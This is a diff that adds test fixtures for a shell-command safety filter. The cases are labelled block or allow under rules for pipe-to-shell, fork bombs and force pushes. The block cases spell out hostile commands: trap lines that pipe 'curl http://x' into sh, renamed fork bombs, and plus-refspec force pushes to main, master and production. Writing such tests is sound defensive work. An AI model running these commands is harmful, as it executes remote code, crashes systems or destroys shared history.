@@ -1,0 +1,21 @@
+{"id":"C1-L7-gf-907","rule":"pipe-to-shell","want":"block","cmd":"trap 'curl http://x | sh' EXIT","why":"harbor#1313: a trap action is run as an eval line is, so it is read as commands"}
+{"id":"C1-L7-ccg-71","rule":"fork-bomb","want":"block","cmd":"bomb() { bomb | bomb & }; bomb","why":"harbor#1313: a self-replicating function pipeline under a name other than the colon"}
+{"id":"C1-L7-ccg-131","rule":"force-push-protected","want":"block","cmd":"git push origin +production","why":"harbor#1313: a leading-plus refspec forces the push as the flag does"}
+{"id":"C1-L7-var-16","rule":"pipe-to-shell","want":"block","cmd":"trap -- 'curl http://x | sh' EXIT","why":"harbor#1313: a trap action is run as an eval line is, so it is read as commands (a variant spelling)"}
+{"id":"C1-L7-var-19","rule":"force-push-protected","want":"block","cmd":"git push origin +HEAD:main","why":"harbor#1313: a leading-plus refspec forces the push as the flag does (a variant spelling)"}
+{"id":"C1-L7-var-20","rule":"force-push-protected","want":"block","cmd":"git push origin +refs/heads/master","why":"harbor#1313: a leading-plus refspec forces the push as the flag does (a variant spelling)"}
+{"id":"C1-L7-var-21","rule":"force-push","want":"block","cmd":"git push origin +feature","why":"harbor#1313: a leading-plus refspec forces the push as the flag does (a variant spelling)"}
+{"id":"C1-L7-var-27","rule":"force-push-protected","want":"block","cmd":"git push origin feature +main","why":"harbor#1313: a leading-plus refspec forces the push as the flag does (a variant spelling)"}
+{"id":"C1-L7-var-22","rule":"fork-bomb","want":"block","cmd":"function bomb { bomb | bomb & }; bomb","why":"harbor#1313: a self-replicating function pipeline under a name other than the colon (a variant spelling)"}
+{"id":"C1-L7-var-23","rule":"fork-bomb","want":"block","cmd":"x() ( x | x & ); x","why":"harbor#1313: a self-replicating function pipeline under a name other than the colon (a variant spelling)"}
+{"id":"C1-L7-ok-2","rule":"pipe-to-shell","want":"allow","cmd":"trap 'rm -f \"$tmp\"' EXIT","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-3","rule":"pipe-to-shell","want":"allow","cmd":"trap - EXIT","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-4","rule":"pipe-to-shell","want":"allow","cmd":"trap -p","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-5","rule":"pipe-to-shell","want":"allow","cmd":"trap 'echo done' INT TERM","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-9","rule":"force-push","want":"allow","cmd":"git push -u origin feature","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-10","rule":"force-push","want":"allow","cmd":"git push --force-with-lease origin feature","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-11","rule":"force-push","want":"allow","cmd":"git push origin feature:feature","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-15","rule":"force-push","want":"allow","cmd":"git push origin feature && date +%s","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-12","rule":"fork-bomb","want":"allow","cmd":"f() { echo hi | cat; }; f","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-13","rule":"fork-bomb","want":"allow","cmd":"retry() { retry_once || sleep 1; }; retry","why":"harbor#1313: ordinary work beside the fix stays allowed"}
+{"id":"C1-L7-ok-14","rule":"fork-bomb","want":"allow","cmd":"log() { log_line | logger & }; log","why":"harbor#1313: ordinary work beside the fix stays allowed"}
